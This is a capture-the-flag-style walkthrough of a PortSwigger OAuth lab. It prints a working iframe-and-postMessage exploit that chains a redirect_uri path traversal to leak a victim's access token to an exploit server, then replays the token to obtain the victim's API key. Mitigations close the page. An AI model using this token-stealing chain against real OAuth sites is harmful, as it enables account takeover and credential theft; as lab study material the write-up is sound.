# Lab 04 — Stealing OAuth access tokens via a proxy page

> **Expert** · [Official lab](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)

**Entry point:** `redirect_uri` allows path traversal (tokens stay on-site)
+ the comment form proxies `location.href` to `postMessage("*")`.

## Solution

1. Confirm `redirect_uri` traversal:
   `.../oauth-callback/../post?postId=1` is accepted.
2. Host the chained exploit:

```html
<iframe src="https://oauth-YOUR-ID.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
<script>
window.addEventListener('message', function(e) {
  fetch('/' + encodeURIComponent(e.data.data));
}, false);
</script>
```

The token fragment lands on the comment form, which postMessages it to any
origin — your script logs it to the exploit server.
3. Deliver to victim; grab the access token from the access log.
4. Replay `GET /me` with `Authorization: Bearer <stolen-token>` — the
   response includes the victim's API key — submit it — lab solved.

## Mitigation

Exact-match `redirect_uri`; never postMessage to `*`; strip fragments
before proxy pages render.
